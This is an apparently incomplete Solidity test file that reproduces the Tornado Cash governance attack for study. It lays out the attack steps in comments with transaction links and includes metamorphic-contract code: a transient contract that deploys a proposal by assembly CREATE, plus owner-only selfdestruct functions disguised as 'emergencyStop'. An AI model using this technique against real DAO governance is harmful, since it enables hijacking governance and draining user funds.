// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from '../../interfaces/IWETH9.sol';
import {Ownable} from "./AttackerOwnable.sol";

contract Exploit_TornadoCashGovernance is TestHarness{
    
    // 0. Deploy a Factory with the transient and a "benign" proposal with the Attacker 2
    // https://explorer.phalcon.xyz/tx/eth/0x3e93ee75ffeb019f1d841b84695538571946fd9477dcd3ecf0790851f48fbd1a?line=0&debugLine=0


    // 1. Submit the proposal #20 allegating some relayers are cheating the protocol with the Attacker 2
    // https://explorer.phalcon.xyz/tx/eth/0x34605f1d6463a48b818157f7b26d040f8dd329273702a0618e9e74fe350e6e0d?line=0&debugLine=0


    // 2. Deploy multiple minion contracts with the exploiter contract and lock zero TORN with each one in the Governance with the Attacker 2
    // https://explorer.phalcon.xyz/tx/eth/0x26672ad9140d11b64964e79d0ed5971c26492786cfe0edf57034229fdc7dc529?line=835&debugLine=835


    // 3. Selfdestruct both the proposal and transient contract
    // https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=0&debugLine=0


    // 4. Re deploy the transient and the new malicious proposal
    // https://explorer.phalcon.xyz/tx/eth/0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122?line=2&debugLine=2


    // 5. Execute the malicious proposal in Tornado closing the position of 4 Relayers (the same mentioned in the proposal #20 description)
    // https://explorer.phalcon.xyz/tx/eth/0x3274b6090685b842aca80b304a4dcee0f61ef8b6afee10b7c7533c32fb75486d?line=3&debugLine=3


    // 6. On each of the previously deployed minion, drain the governance by calling unlock() and transfer() the TORN tokens to the Attacker 1
    // https://explorer.phalcon.xyz/tx/eth/0x13e2b7359dd1c13411342fd173750a19252f5b0d92af41be30f9f62167fc5b94?line=12&debugLine=12
}

interface IReinitializableContractFactory {
    function getInitializationCode() external returns (bytes memory);
}

interface ITransitionContract {
    function emergencyStop() external;
}

interface IProposal {
    function emergencyStop() external;
    function executeProposal() external;
}

// Factory capable of deploying contracts that selfdestruct changing their implementation 
// using a combination of create2 and create with a transient contract
// Deployed at tx: https://etherscan.io/tx/0x3e93ee75ffeb019f1d841b84695538571946fd9477dcd3ecf0790851f48fbd1a
contract ReinitializableContractFactory is Ownable {

    constructor() {}


    // This function implements the logic behind the deployment for a proposal via a transient contract
    // First, the transient contract is deployed with Create2 and then the latter deploys the proposal with Create
    // More details: https://explorer.phalcon.xyz/tx/eth/0xa7d20ccdbc2365578a106093e82cc9f6ec5d03043bb6a00114c0ad5d03620122?line=0&debugLine=0
    function _createProposalWithTransient() internal {}
}

contract TransientContract is Ownable {
    // The owner of this contract will be the Factory

    address factory;
    address proposal;

    constructor() payable {
        factory = msg.sender;

        // Transfer the ownership of this contract to the factory
        _transferOwnership(factory);

        // Deployment of Proposal
        // retrieve the target implementation address from creator of this contract.
        bytes memory initCode = IReinitializableContractFactory(msg.sender).getInitializationCode();

        // set up a memory location for the address of the new Proposal contract.
        address payable proposalContractAddress;

        uint256 value = msg.value;

        // deploy the Proposal contract address using the supplied init code.
        /* solhint-disable no-inline-assembly */
        assembly {
        let encoded_data := add(0x20, initCode) // load initialization code.
        let encoded_size := mload(initCode)     // load init code's length.
        proposalContractAddress := create(   // call CREATE with 3 arguments.
            value,                            // forward any supplied endowment.
            encoded_data,                         // pass in initialization code.
            encoded_size                          // pass in init code's length.
        )
        } /* solhint-enable no-inline-assembly */

        // ensure that the metamorphic contract was successfully deployed.
        require(proposalContractAddress != address(0));
        proposal = proposalContractAddress;

        // destroy transient contract and forward all value to metamorphic contract.
        // selfdestruct(proposalContractAddress);
    }

    // The attacker named this function after "emergencyStop"
    // More details: https://explorer.phalcon.xyz/tx/eth/0xd3a570af795405e141988c48527a595434665089117473bc0389e83091391adb?line=1&debugLine=1
    // This call first triggers the destruction of the Proposal and then its own.
    function emergencyStop() external onlyOwner {

        selfdestruct(payable(owner()));
    }
}

contract Initial_Proposal is IProposal, Ownable {
    // The owner of this contract will be the Transient Contract

    // The attacker did not verify this contract as it would have disclosed the selfdestruct
    function executeProposal() external {}

    function emergencyStop() external onlyOwner {
        selfdestruct(payable(owner()));
    }
}
